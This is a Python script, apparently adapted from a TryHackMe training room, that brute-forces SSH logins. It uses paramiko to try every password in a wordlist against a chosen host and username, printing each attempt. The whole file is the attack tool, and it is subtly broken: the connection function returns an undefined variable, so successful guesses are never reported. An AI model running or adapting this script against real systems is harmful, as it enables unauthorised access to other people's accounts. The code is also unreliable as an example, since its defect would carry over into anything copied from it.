"""
sshlogin - an ssh login brute-force

Based on sample code from
https://tryhackme.com/room/pythonforcybersecurity
"""


import sys
import os

import argparse
import paramiko


def ssh_connect(target, port, username, password):

    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    success = False

    try:
        ssh.connect(target, port, username=username, password=password)
        success = True
    except paramiko.AuthenticationException:
        success = False

    ssh.close()
    return result


def main():

    parser = argparse.ArgumentParser()
    
    parser.add_argument(
            "-t", "--target", help="the host IP number")

    parser.add_argument(
            "-p", "--port", help="the host portnumber", 
            default=22, required=False)

    parser.add_argument(
            "-u", "--username", help="the username")

    parser.add_argument(
            "-w", "--wordlist", help="a password wordlist file")

    args = parser.parse_args()

    with open(args.wordlist, 'r') as file:
        for line in file:
            password = line.strip()

            try:
                success = ssh_connect(
                        args.target, args.port, args.username, password)

                if success:
                    print(f"[+] {password}")
                    break
                else:
                    print(f"[-] {password}")

            except Exception as e:
                print(e)


if __name__ == "__main__":
    main()
